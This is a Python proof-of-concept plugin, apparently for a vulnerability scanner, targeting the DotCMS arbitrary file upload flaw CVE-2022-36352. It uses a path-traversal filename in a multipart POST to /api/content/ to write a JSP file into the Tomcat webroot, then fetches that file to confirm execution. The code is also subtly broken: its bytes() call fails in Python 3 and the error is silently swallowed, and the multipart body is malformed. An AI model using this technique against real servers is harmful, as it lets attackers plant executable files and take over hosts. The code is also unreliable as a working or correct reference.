#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'DotCMS Arbitrary File Upload CVE-2022-36352',

      'level'     :   'critical',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5
def run(url,ua):
  randstr = randomLowercase(20)
  md5str = hashmd5(randstr)
  filename = randomInt(100000000000,250000000000)
  rboundary = randomLowercase(8)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/content/'
  data = f'''
--------------------------WebKitFormBoundary{rboundary}\r\n\
        Content-Disposition: form-data; name=\"name\"; filename=\"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{filename}.jsp\"\r\n\
        Content-Type: text/plain\r\n\
        \r\n\
        <%\r\n\
        out.println(\"{md5str}\");%>\r\n\
        --------------------------WebKitFormBoundary{rboundary}--\r\n\
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    res.close()
    resp = requests.get(url=url+f'/{filename}.jsp',headers=headers,timeout=7,verify=False)
    if resp.status_code == 200 and bytes(md5str) in resp.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret